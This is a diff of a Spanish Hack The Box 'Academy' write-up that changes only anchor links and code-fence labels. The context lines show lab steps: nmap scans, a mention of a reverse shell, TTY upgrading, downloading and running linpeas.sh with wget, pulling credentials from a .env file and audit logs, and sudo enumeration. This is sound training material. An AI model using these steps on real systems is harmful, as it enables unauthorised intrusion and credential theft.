@@ -32,17 +32,17 @@ Con enumeración básica nos daremos cuenta de que `mrb3n` puede ejecutar `/usr/
 
 ...
 
-1. [Enumeración](#enumeración).
-2. [Explotación](#explotación).
+1. [Enumeración](#enumeracion).
+2. [Explotación](#explotacion).
 3. [Escalada de privilegios](#escalada-de-privilegios).
 
 ...
 
-## Enumeración [#](#enumeración) {#enumeración}
+## Enumeración [#](#enumeracion) {#enumeracion}
 
 Empezamos realizando un escaneo de puertos para saber que servicios esta corriendo.
 
-```sh
+```bash
 –» nmap -p- --open -v 10.10.10.215 -oG initScan
 ```
 
@@ -53,7 +53,7 @@ Empezamos realizando un escaneo de puertos para saber que servicios esta corrien
 | -v         | Permite ver en consola lo que va encontrando                                                             |
 | -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |
 
-```sh
+```bash
 –» cat initScan 
 # Nmap 7.80 scan initiated Wed Jan 13 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.215
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -72,7 +72,7 @@ Muy bien, ¿que tenemos?
 
 Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:
 
-```sh
+```bash
 –» nmap -p 22,80,33060 -sC -sV 10.10.10.215 -oN portScan
 ```
 
@@ -83,7 +83,7 @@ Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello o
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 –» cat portScan
 # Nmap 7.80 scan initiated Wed Jan 13 25:25:25 2021 as: nmap -p 22,80,33060 -sC -sV -oN portScan 10.10.10.215
 Nmap scan report for 10.10.10.215                                                               
@@ -172,7 +172,7 @@ Hacemos el mismo proceso de creación de cuenta solo que ahora nos apoyamos medi
 
 ...
 
-## Explotación [#](#explotación) {#explotación}
+## Explotación [#](#explotacion) {#explotacion}
 
 ![297page80_register_newID](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_register_newID.png)
 
@@ -182,7 +182,7 @@ Validando, no hay cambio (a simple vista) en la web donde tenemos todos los mód
 
 Perfecto, tamos dentro del login como usuario administrador... Nos topamos con unos ítems a hacer, entre ellos el ultimo esta pendiente: (Arreglar problema con `dev-staging-01.academy.htb`), por lo tanto agreguemos ese dominio al `/etc/hosts` y veamos que tiene:
 
-```sh
+```bash
 –» cat /etc/hosts
 ...
 10.10.10.215  academy.htb dev-staging-01.academy.htb
@@ -237,7 +237,7 @@ Bien, tenemos ejecución de comandos en el sistema, intentemos generar una rever
 
 Listos, tamos dentro, hagamos de nuestra Shell una totalmente interactiva, ya que con la que tenemos estamos limitados, no podemos ver los comandos anteriormente ingresados, no podemos hacer `CTRL + C`, así que hagamos tratamiento de la TTY:
 
-```sh
+```bash
 www-data@academy:/var/www/html/htb-academy-dev-01/public$ script /dev/null -c bash
 # Ahora CTRL + Z (acá volvemos a nuestra máquina de atacante)
 # Escribimos lo siguiente:
@@ -257,7 +257,7 @@ En ejecución se veria asi:
 
 Y por ultimo indicamos:
 
-```sh
+```bash
 www-data@academy:/var/www/html/htb-academy-dev-01/public$ export TERM=xterm
 www-data@academy:/var/www/html/htb-academy-dev-01/public$ export SHELL=bash
 www-data@academy:/var/www/html/htb-academy-dev-01/public$ stty rows 43 columns 192 (Esto es para contar con toda la pantalla, depende de la pantalla de cada uno, para verificar abran una terminal y escriban `stty -a`, ahí salen las filas y columnas. El mejor ejemplo del uso de esto es corriendo `nano` antes de ejecutar esta línea)
@@ -275,7 +275,7 @@ En este recurso s4vitar lo explica en un video:
 
 Ahora si, sigamos:
 
-```sh
+```bash
 www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls -la /home/
 total 32
 drwxr-xr-x  8 root     root     4096 Aug 10 00:34 .
@@ -292,12 +292,12 @@ Varios usuarios en el sistema, vemos dos que han sido actualizados hace poco, `c
 
 Subiendo el script de enumeración `linpeas.sh` a la máquina y ejecutándolo conseguimos una contraseña:
 
-```sh
+```bash
 –» python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-```sh
+```bash
 www-data@academy:/dev/shm$ wget http://10.10.14.141:8000/linpeas.sh
 www-data@academy:/dev/shm$ chmod +x linpeas.sh
 www-data@academy:/dev/shm$ ./linpeas.sh
@@ -308,7 +308,7 @@ www-data@academy:/dev/shm$ ./linpeas.sh
 
 Tenemos en el archivo `/var/www/html/academy/.env` una contraseña. Pues, ya que estamos probemos con alguno de los usuarios a ver si se nos permite el login:
 
-```sh
+```bash
 www-data@academy:/dev/shm$ ls /home/
 21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
 www-data@academy:/dev/shm$ su 21y4d
@@ -326,7 +326,7 @@ $
 
 Perfectoo, ahora... A seguir enumerando.
 
-```sh
+```bash
 $ script /dev/null -c bash
 Script started, file is /dev/null
 cry0l1t3@academy:/dev/shm$ 
@@ -352,7 +352,7 @@ El cual habla de [como](https://wiki.archlinux.org/index.php/PAM_(Espa%C3%B1ol))
 
 Si lo ejecutamos, tenemos:
 
-```sh
+```bash
 cry0l1t3@academy:/dev/shm$ aureport --tty
 
 TTY Report
@@ -372,7 +372,7 @@ NOTE - using built-in logs: /var/log/audit/audit.log
 
 Bien, obtenemos unas posibles credenciales del usuario `mrb3n`, validemoslas:
 
-```sh
+```bash
 cry0l1t3@academy:/dev/shm$ su mrb3n
 Password: 
 $ id
@@ -384,7 +384,7 @@ Nice, pues veamos para qué queremos ser el usuario `mrb3n` en el sistema...
 
 Después de enumerar y no enumerar lo básico :P encontramos esto:
 
-```sh
+```bash
 $ script /dev/null -c bash
 Script started, file is /dev/null
 mrb3n@academy:/dev/shm$ sudo -l
